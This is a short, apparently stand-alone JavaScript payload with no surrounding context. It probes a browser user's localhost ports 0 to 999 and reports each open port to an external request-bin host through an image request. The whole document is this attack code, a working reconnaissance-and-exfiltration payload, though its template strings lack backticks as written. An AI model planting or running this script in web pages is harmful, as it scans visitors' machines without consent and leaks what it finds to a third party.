const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = https://enjvgl53rrbci.x.pipedream.net/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
